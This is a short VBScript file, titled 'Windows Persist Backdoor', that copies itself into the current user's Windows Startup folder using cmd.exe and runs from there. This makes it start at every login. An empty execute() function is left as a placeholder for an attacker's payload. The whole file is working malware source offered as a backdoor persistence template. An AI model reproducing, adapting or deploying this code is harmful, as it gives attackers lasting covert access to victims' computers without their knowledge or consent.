function execute()
'#Code'
End function

'###Main BEGIN###'
Set oShell = CreateObject("WScript.Shell")
filname = WScript.ScriptFullName
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.GetFile(filname)
ofilnme = objFSO.GetFileName(objFile)
hompath = oShell.ExpandEnvironmentStrings("%USERPROFILE%")
tarpath = hompath & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
curpath = oShell.CurrentDirectory
If tarpath=curpath Then
execute()
Else
cpy = "cmd.exe /i /H /C copy" & " """ & filname & """ " & " """ & tarpath & """ "
oShell.run(cpy)
srt = "cmd /c /i /H cd / & cd %USERPROFILE% & cd ""AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"" & start " & ofilnme
oShell.run(srt)
End If
'###Main END###'

'#Project - Windows Persist Backdoor'
'#Version - 1.0'
'#Creator - Soubhik Biswas'